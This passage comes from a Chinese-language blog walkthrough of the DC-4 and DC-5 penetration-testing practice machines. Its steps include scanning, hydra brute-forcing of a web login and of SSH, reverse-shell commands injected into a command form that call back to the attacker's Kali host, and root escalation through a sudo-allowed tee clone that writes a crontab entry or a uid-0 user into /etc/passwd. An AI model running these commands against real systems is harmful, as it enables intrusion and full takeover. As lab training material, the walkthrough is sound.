at 21:03, 13.00s elapsed</span><br><span class="line">Initiating SYN Stealth Scan at 21:03</span><br><span class="line">Scanning 192.168.33.140 [65535 ports]</span><br><span class="line">Discovered open port 80&#x2F;tcp on 192.168.33.140</span><br><span class="line">Discovered open port 22&#x2F;tcp on 192.168.33.140</span><br><span class="line">Completed SYN Stealth Scan at 21:03, 1.50s elapsed (65535 total ports)</span><br><span class="line">Initiating Service scan at 21:03</span><br><span class="line">Scanning 2 services on 192.168.33.140</span><br><span class="line">Completed Service scan at 21:03, 6.10s elapsed (2 services on 1 host)</span><br><span class="line">Initiating OS detection (try #1) against 192.168.33.140</span><br><span class="line">NSE: Script scanning 192.168.33.140.</span><br><span class="line">Initiating NSE at 21:03</span><br><span class="line">Completed NSE at 21:03, 0.18s elapsed</span><br><span class="line">Initiating NSE at 21:03</span><br><span class="line">Completed NSE at 21:03, 0.01s elapsed</span><br><span class="line">Initiating NSE at 21:03</span><br><span class="line">Completed NSE at 21:03, 0.00s elapsed</span><br><span class="line">Nmap scan report for 192.168.33.140</span><br><span class="line">Host is up (0.00047s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)</span><br><span class="line">|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)</span><br><span class="line">|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    nginx 1.15.10</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST</span><br><span class="line">|_http-server-header: nginx&#x2F;1.15.10</span><br><span class="line">|_http-title: System Tools</span><br><span class="line">MAC Address: 00:0C:29:64:8A:3D (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 0.003 days (since Tue Apr 27 20:59:04 2021)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;257 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.47 ms 192.168.33.140</span><br><span class="line"></span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">Initiating NSE at 21:03</span><br><span class="line">Completed NSE at 21:03, 0.00s elapsed</span><br><span class="line">Initiating NSE at 21:03</span><br><span class="line">Completed NSE at 21:03, 0.00s elapsed</span><br><span class="line">Initiating NSE at 21:03</span><br><span class="line">Completed NSE at 21:03, 0.00s elapsed</span><br><span class="line">Read data files from: &#x2F;usr&#x2F;bin&#x2F;..&#x2F;share&#x2F;nmap</span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 23.53 seconds</span><br><span class="line">           Raw packets sent: 65558 (2.885MB) | Rcvd: 65550 (2.623MB)</span><br></pre></td></tr></table></figure>

<p>dirsearch扫一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Target: http:&#x2F;&#x2F;192.168.33.140&#x2F;                                                                                                                               </span><br><span class="line">                                                                                                                                                             </span><br><span class="line">Output File: &#x2F;root&#x2F;tools&#x2F;dirsearch&#x2F;reports&#x2F;192.168.33.140&#x2F;_21-04-27_21-12-32.txt</span><br><span class="line"></span><br><span class="line">[21:12:32] Starting: </span><br><span class="line">[21:12:39] 302 -  704B  - &#x2F;command.php  -&gt;  index.php                                                                                   </span><br><span class="line">[21:12:40] 301 -  170B  - &#x2F;css  -&gt;  http:&#x2F;&#x2F;192.168.33.140&#x2F;css&#x2F;                    </span><br><span class="line">[21:12:41] 301 -  170B  - &#x2F;images  -&gt;  http:&#x2F;&#x2F;192.168.33.140&#x2F;images&#x2F;                                  </span><br><span class="line">[21:12:41] 403 -  556B  - &#x2F;images&#x2F;           </span><br><span class="line">[21:12:41] 200 -  506B  - &#x2F;index.php                                                                           </span><br><span class="line">[21:12:42] 302 -  206B  - &#x2F;login.php  -&gt;  index.php                                                     </span><br><span class="line">[21:12:42] 302 -  163B  - &#x2F;logout.php  -&gt;  index.php</span><br></pre></td></tr></table></figure>



<h2 id="暴力破解弱口令"><a href="#暴力破解弱口令" class="headerlink" title="暴力破解弱口令"></a>暴力破解弱口令</h2><p>没有发现什么可疑信息，登录网页发现一个登录框，于是我们尝试hydra爆破一下子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀AGsite)-[~&#x2F;tools&#x2F;pass]</span><br><span class="line">└─# hydra -l admin -P rockyou.txt 192.168.33.140 http-post-form &quot;&#x2F;login.php:username&#x3D;^USER^&amp;password&#x3D;^PASS^:S&#x3D;logout&quot;                                        </span><br><span class="line">Hydra v9.1 (c) 2020 by van Hauser&#x2F;THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) starting at 2021-04-28 01:28:25</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1&#x2F;p:14344399), ~896525 tries per task</span><br><span class="line">[DATA] attacking http-post-form:&#x2F;&#x2F;192.168.33.140:80&#x2F;login.php:username&#x3D;^USER^&amp;password&#x3D;^PASS^:S&#x3D;logout</span><br><span class="line">[80][http-post-form] host: 192.168.33.140   login: admin   password: happy</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) finished at 2021-04-28 01:28:36</span><br></pre></td></tr></table></figure>

<p>得到admin的密码是happy</p>
<blockquote>
<p>这里hydra的</p>
<p>:S参数之所以是logout，是因为我们之前抓取到了logout.php，所以猜测登录成功会有logout</p>
</blockquote>
<blockquote>
<p>4、post方式提交，破解web登录：</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hydra -l 用户名 -P 密码字典 -s <span class="number">80</span> ip http-post-form <span class="string">"/admin/login.php:username=^USER^&amp;password=^PASS^&amp;submit=login:sorry password"</span></span><br><span class="line"></span><br><span class="line">hydra -t <span class="number">3</span> -l admin -P pass.txt -o <span class="keyword">out</span>.txt -f <span class="number">10.36</span><span class="number">.16</span><span class="number">.18</span> http-post-form <span class="string">"login.php:id=^USER^&amp;passwd=^PASS^:&lt;title&gt;wrong username or password&lt;/title&gt;"</span></span><br></pre></td></tr></table></figure>

<p>（参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密码就停止， 10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解,<title>中的内容是表示错误猜解的返回信息提示。）</title></p>
</blockquote>
<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>这里我们先让kali监听一下2233端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2233</span><br></pre></td></tr></table></figure>

<p>然后bp抓个包，在执行命令处填写</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e &#x2F;bin&#x2F;bash 192.168.33.128【kali的ip】 2233</span><br></pre></td></tr></table></figure>

<p>但是有些靶机上没有nc命令，所以还是用bash最稳</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.33.128【kali的ip】&#x2F;2233 0&gt;&amp;1&#39;</span><br><span class="line">但这里&amp;会被解析为且，所以我们url编码一下【%26】</span><br><span class="line">bash -c &#39;bash -i &gt;%26 &#x2F;dev&#x2F;tcp&#x2F;192.168.33.128【kali的ip】&#x2F;2233 0&gt;%261&#39;</span><br></pre></td></tr></table></figure>

<p>连上！！！</p>
<p>这里如果是nc连接的，我们可以需要执行一下以下命令来获取一个交互式页面</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br></pre></td></tr></table></figure>





<h2 id="暴力破解ssh"><a href="#暴力破解ssh" class="headerlink" title="暴力破解ssh"></a>暴力破解ssh</h2><p>我们在jim的家目录下找到了一个oldpassword.bak，然后我们用awk命令从/etc/passwd里获取一下用户名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F &#39;:&#39; &#39;print&#123;$1&#125;&#39;</span><br></pre></td></tr></table></figure>

<p>然后尝试一下ssh暴力破解</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L olduser -P oldpass ssh:&#x2F;&#x2F;192.168.33.140:22</span><br></pre></td></tr></table></figure>

<p>我们爆破得到jim的密码是jibril04</p>
<p>然后ssh登录一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh jim@192.168.33.140</span><br></pre></td></tr></table></figure>

<p>登录之后看到有一条邮件，打开之后发现没哈用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">jim@dc-4:&#x2F;var&#x2F;mail$ cat &#x2F;home&#x2F;jim&#x2F;mbox</span><br><span class="line">From root@dc-4 Sat Apr 06 20:20:04 2019</span><br><span class="line">Return-path: &lt;root@dc-4&gt;</span><br><span class="line">Envelope-to: jim@dc-4</span><br><span class="line">Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">Received: from root by dc-4 with local (Exim 4.89)</span><br><span class="line">        (envelope-from &lt;root@dc-4&gt;)</span><br><span class="line">        id 1hCiQe-0000gc-EC</span><br><span class="line">        for jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">To: jim@dc-4</span><br><span class="line">Subject: Test</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text&#x2F;plain; charset&#x3D;&quot;UTF-8&quot;</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">Message-Id: &lt;E1hCiQe-0000gc-EC@dc-4&gt;</span><br><span class="line">From: root &lt;root@dc-4&gt;</span><br><span class="line">Date: Sat, 06 Apr 2019 20:20:04 +1000</span><br><span class="line">Status: RO</span><br><span class="line"></span><br><span class="line">This is a test.</span><br></pre></td></tr></table></figure>

<p>所以再找找，然后发现/var/mail/jim下也有一条邮件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Hi Jim,</span><br><span class="line"></span><br><span class="line">I&#39;m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.</span><br><span class="line"></span><br><span class="line">Password is:  ^xHhA&amp;hvim0y</span><br><span class="line"></span><br><span class="line">See ya,</span><br><span class="line">Charles</span><br></pre></td></tr></table></figure>

<p>我们发现了Charles的密码<code>^xHhA&amp;hvim0y</code>        </p>
<p>于是我们<code>su - charles</code>登录一下。</p>
<h2 id="teebee提权"><a href="#teebee提权" class="headerlink" title="teebee提权"></a>teebee提权</h2><p>然后<code>sudo -l</code>，发现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">charles@dc-4:&#x2F;home$ sudo -l</span><br><span class="line">Matching Defaults entries for charles on dc-4:</span><br><span class="line">    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin</span><br><span class="line"></span><br><span class="line">User charles may run the following commands on dc-4:</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;teehee</span><br></pre></td></tr></table></figure>

<p>我们发现可以使用teehee命令提权，我们查看一下teehee命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">charles@dc-4:&#x2F;home$ teehee --help</span><br><span class="line">Usage: teehee [OPTION]... [FILE]...</span><br><span class="line">Copy standard input to each FILE, and also to standard output.</span><br><span class="line"></span><br><span class="line">  -a, --append              append to the given FILEs, do not overwrite</span><br><span class="line">  -i, --ignore-interrupts   ignore interrupt signals</span><br><span class="line">  -p                        diagnose errors writing to non pipes</span><br><span class="line">      --output-error[&#x3D;MODE]   set behavior on write error.  See MODE below</span><br><span class="line">      --help     display this help and exit</span><br><span class="line">      --version  output version information and exit</span><br><span class="line"></span><br><span class="line">MODE determines behavior with write errors on the outputs:</span><br><span class="line">  &#39;warn&#39;         diagnose errors writing to any output</span><br><span class="line">  &#39;warn-nopipe&#39;  diagnose errors writing to any output not a pipe</span><br><span class="line">  &#39;exit&#39;         exit on error writing to any output</span><br><span class="line">  &#39;exit-nopipe&#39;  exit on error writing to any output not a pipe</span><br><span class="line">The default MODE for the -p option is &#39;warn-nopipe&#39;.</span><br><span class="line">The default operation when --output-error is not specified, is to</span><br><span class="line">exit immediately on error writing to a pipe, and diagnose errors</span><br><span class="line">writing to non pipe outputs.</span><br><span class="line"></span><br><span class="line">GNU coreutils online help: &lt;http:&#x2F;&#x2F;www.gnu.org&#x2F;software&#x2F;coreutils&#x2F;&gt;</span><br><span class="line">Full documentation at: &lt;http:&#x2F;&#x2F;www.gnu.org&#x2F;software&#x2F;coreutils&#x2F;tee&gt;</span><br><span class="line">or available locally via: info &#39;(coreutils) tee invocation&#39;</span><br></pre></td></tr></table></figure>

<p>大概就是这样：</p>
<blockquote>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>使用指令”tee”将用户输入的数据同时保存到文件”file1”和”file2”中，输入如下命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tee file1 file2                   #在两个文件中复制内容 </span><br></pre></td></tr></table></figure>

<p>以上命令执行后，将提示用户输入需要保存到文件的数据，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">My Linux                        #提示用户输入数据  </span><br><span class="line"></span><br><span class="line">My Linux                        #输出数据，进行输出反馈  </span><br></pre></td></tr></table></figure>
</blockquote>
<p>总结一下，就是现在我们可以向文件内写入内容了，那么就有两条路可以走：</p>
<ol>
<li>将chmod的命令写入计划任务/rtc/crontab</li>
<li>直接往/etc/passwd里写入一个id为0的用户</li>
</ol>
<h3 id="计划任务修改权限"><a href="#计划任务修改权限" class="headerlink" title="计划任务修改权限"></a>计划任务修改权限</h3><p>我们首先看一下/bin/sh的权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -al &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>

<p>因为teehee可以执行root权限，所以我们</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo teehee &#x2F;etc&#x2F;crontab</span><br><span class="line"></span><br><span class="line">* * * * * root chmod 4777 &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>

<p>然后执行/bin/sh</p>
<p><img src="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/4-2.png" alt="4-2"></p>
<h3 id="直接id-0写入passwd"><a href="#直接id-0写入passwd" class="headerlink" title="直接id=0写入passwd"></a>直接id=0写入passwd</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;a1batr0ss::0:0:::&#x2F;bin&#x2F;bash&quot; | sudo teehee -a &#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line">su - a1batr0ss</span><br></pre></td></tr></table></figure>

<p>即可获取root权限</p>
<h1 id="DC-5"><a href="#DC-5" class="headerlink" title="DC-5"></a>DC-5</h1><h2 id="信息收集-4"><a href="#信息收集-4" class="headerlink" title="信息收集"></a>信息收集</h2><p>扫一下IP是192.168.33.141</p>
<p>扫一下端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -A -vv 192.168.33.141</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE REASON         VERSION</span><br><span class="line">80&#x2F;tcp    open  http    syn-ack ttl 64 nginx 1.6.2</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST</span><br><span class="line">|_http-server-header: nginx&#x2F;1.6.2</span><br><span class="line">|_http-title: Welcome</span><br><span class="line">111&#x2F;tcp   open  rpcbind syn-ack ttl 64 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port&#x2F;proto  service</span><br><span class="line">|   100000  2,3,4        111&#x2F;tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111&#x2F;udp   rpcbind</span><br><span class="line">|   100000  3,4          111&#x2F;tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111&#x2F;udp6  rpcbind</span><br><span class="line">|   100024  1          35673&#x2F;udp6  status</span><br><span class="line">|   100024  1          37297&#x2F;tcp   status</span><br><span class="line">|   100024  1          47126&#x2F;udp   status</span><br><span class="line">|_  100024  1          55076&#x2F;tcp6  status</span><br><span class="line">37297&#x2F;tcp open  status  syn-ack ttl 64 1 (RPC #100024)</span><br></pre></td></tr></table></figure>



<p>dirsearch扫一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Target: http:&#x2F;&#x2F;192.168.33.141&#x2F;                                                                                                                               </span><br><span class="line">                                                                                                                                                             </span><br><span class="line">Output File: &#x2F;root&#x2F;tools&#x2F;dirsearch&#x2F;reports&#x2F;192.168.33.141&#x2F;_21-04-30_03-25-47.txt</span><br><span class="line"></span><br><span class="line">[03:25:47] Starting: </span><br><span class="line">[03:25:54] 200 -    4KB - &#x2F;contact.php                                                                                                  </span><br><span class="line">[03:25:54] 301 -  184B  - &#x2F;css  -&gt;  http:&#x2F;&#x2F;192.168.33.141&#x2F;css&#x2F;</span><br><span class="line">[03:25:55] 200 -    6KB - &#x2F;faq.php                                          </span><br><span class="line">[03:25:56] 301 -  184B  - &#x2F;images  -&gt;  http:&#x2F;&#x2F;192.168.33.141&#x2F;images&#x2F;                                  </span><br><span class="line">[03:25:56] 403 -  570B  - &#x2F;images&#x2F;           </span><br><span class="line">[03:25:56] 200 -    4KB - &#x2F;index.php                                                                           </span><br><span class="line">[03:26:00] 200 -  852B  - &#x2F;thankyou.php</span><br></pre></td></tr></table></figure>





<p><img src="/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/5-1.png" alt="5-1"></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">George</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://yoursite.com/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/">http://yoursite.com/2021/04/08/%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"></div><div class="addthis_inline_share_toolbox pull-right"></div><script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=undefined" async></script><nav id="pagination"><div class="prev-post pull-left"><a href="/2021/04/30/%E8%80%83%E7%A0%94%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"><i class="fa fa-chevron-left">  </i><span>考研信息收集</span></a></div><div class="next-post pull-right"><a href="/2021/03/21/linux100%E8%AE%B2/"><span>linux100讲</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By George</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body></html>